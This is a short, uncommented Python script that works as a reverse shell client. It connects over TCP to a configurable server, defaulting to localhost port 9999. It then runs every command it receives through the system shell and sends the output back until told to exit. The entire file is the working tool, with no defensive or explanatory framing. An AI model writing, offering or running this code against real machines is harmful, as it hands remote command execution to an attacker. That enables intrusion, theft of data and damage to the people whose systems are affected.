import socket
import subprocess

def connect_to_server(ip='127.0.0.1', port=9999):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((ip, port))
    
    while True:
        command = client.recv(1024).decode()
        if command.lower() == "exit":
            break

        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            client.send(output)
        except subprocess.CalledProcessError as e:
            client.send(e.output)
        except Exception as err:
            client.send(f"Error: {err}".encode())

    client.close()

if __name__ == "__main__":
    connect_to_server()
